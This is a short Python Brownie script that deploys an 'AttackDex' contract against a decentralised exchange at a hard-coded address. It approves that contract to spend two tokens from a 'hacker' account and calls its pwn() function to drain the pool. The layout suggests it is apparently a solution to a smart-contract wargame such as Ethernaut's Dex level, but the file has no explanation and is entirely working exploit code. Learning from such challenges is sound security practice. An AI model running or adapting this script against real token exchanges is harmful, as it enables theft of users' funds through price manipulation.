# Import necessary modules from Brownie
from brownie import accounts, config, interface, Dex, AttackDex

# Define the main function
def main():

    # Define the contract address of the DEX
    contract = '0xfE0629e674441e41Bfc333Ed0bC964db620c488f'
    hacker = accounts.add(config['wallets']['from_key'])

    # Get the contract interface for the DEX
    dex = Dex.at(contract)

    # # Get the interface for the first and second tokens in the DEX
    token1 = interface.IERC20(dex.token1())
    token2 = interface.IERC20(dex.token2())

    # Approve the DEX to spend 100 tokens from each of the two tokens for the hacker's account

    attack_contract = AttackDex.deploy(contract, {"from":hacker})

    token1.approve(attack_contract, 100, {'from': hacker})
    token2.approve(attack_contract, 100, {'from': hacker})
    attack_contract.pwn({"from":hacker, "gas_limit": 5000000,'allow_revert':True})